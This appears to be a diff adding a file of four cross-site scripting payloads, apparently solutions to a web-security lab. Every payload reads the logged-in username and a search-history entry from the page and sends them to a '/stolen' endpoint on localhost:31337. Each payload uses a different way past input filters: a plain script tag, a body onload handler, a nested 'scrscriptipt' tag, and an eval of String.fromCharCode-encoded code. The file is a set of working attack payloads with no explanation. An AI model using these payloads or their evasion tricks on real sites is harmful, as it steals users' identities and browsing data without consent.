@@ -1,0 +1,26 @@
+xss_0:
+<script>
+$( document ).ready(function() {
+name = document.getElementById("logged-in-user").innerHTML;
+search = document.getElementById("history-list").getElementsByClassName("list-group-item")[1].innerHTML;
+$.get("https://localhost:31337/stolen?user=" + name + "&last_search=" + search);
+});
+</script>
+
+xss_1:
+<body onload="(function() { name = document.getElementById('logged-in-user').innerHTML;
+search = document.getElementById('history-list').getElementsByClassName('list-group-item')[1].innerHTML;
+$.get('https://localhost:31337/stolen?user=' + name + '&last_search=' + search);
+})();">
+
+xss_2:
+<scrscriptipt>
+$( document ).ready(function() {
+name = document.getElementById("logged-in-user").innerHTML;
+search = document.getElementById("history-list").getElementsByClassName("list-group-item")[1].innerHTML;
+$.get("https://localhost:31337/stolen?user=" + name + "&last_search=" + search);
+});
+</scrscriptipt>
+
+xss_3:
+<body onload=eval(String.fromCharCode(40,102,117,110,99,116,105,111,110,40,41,32,123,32,10,110,97,109,101,32,61,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,108,111,103,103,101,100,45,105,110,45,117,115,101,114,39,41,46,105,110,110,101,114,72,84,77,76,59,10,115,101,97,114,99,104,32,61,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,104,105,115,116,111,114,121,45,108,105,115,116,39,41,46,103,101,116,69,108,101,109,101,110,116,115,66,121,67,108,97,115,115,78,97,109,101,40,39,108,105,115,116,45,103,114,111,117,112,45,105,116,101,109,39,41,91,49,93,46,105,110,110,101,114,72,84,77,76,59,10,36,46,103,101,116,40,39,104,116,116,112,115,58,47,47,108,111,99,97,108,104,111,115,116,58,51,49,51,51,55,47,115,116,111,108,101,110,63,117,115,101,114,61,39,32,43,32,110,97,109,101,32,43,32,39,38,108,97,115,116,95,115,101,97,114,99,104,61,39,32,43,32,115,101,97,114,99,104,41,59,10,125,41,40,41,59))>
